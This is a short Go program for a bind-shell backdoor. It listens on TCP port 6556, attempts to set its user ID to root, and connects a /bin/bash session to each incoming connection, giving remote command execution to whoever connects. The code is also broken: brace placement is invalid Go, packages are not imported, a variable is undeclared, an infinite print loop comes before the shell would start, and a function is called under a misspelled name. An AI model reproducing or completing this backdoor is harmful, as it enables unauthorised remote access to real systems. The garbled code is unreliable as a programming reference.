package main

import 
(
"fmt"
"net"
"os/exec"
"syscall"
)

func handleError(err error) int
{
	if err != nil
	{
		return 1
	}
	return 0
}


func spawnShell(conn net.Conn) 
{
	currentUser, _ := user.Current()
	username = currentUser.username()
	hostname, _ := os.hostname()

	fmt.Printf("\n✅ Received connection from %v\n", conn.RemoteAddr().String())
	conn.Write([]byte("✅ Connection established!\n"))
	for
	{
		fmt.Printf("\nWork in progress: create rich prompt")
	}

	spawn := exec.Command("/bin/bash")
	spawn.Stdin = conn
	spawn.Stdout = conn
	spawn.Stderr = conn
	spawn.Run()
}

func main() 
{
	ln, err := net.Listen("tcp", ":6556")
	if handleError(err) == 1
	{
		fmt.Printf("❌ An error has occured with listening: %v\n", err)
	}
	else
	{
		fmt.Printf("\n🟡 Listening...")
	}
	syscall.Setuid(0)
	for
	{
		con, err := ln.Accept()
		if handleError(err) == 1
		{
			fmt.Printf("❌ An error occurred during an attempted connection: %v\n", err)
		} 
		else
		{
			fmt.Printf("\n✅ Connection established")
		}
	go spawnshell(con)
	}
}
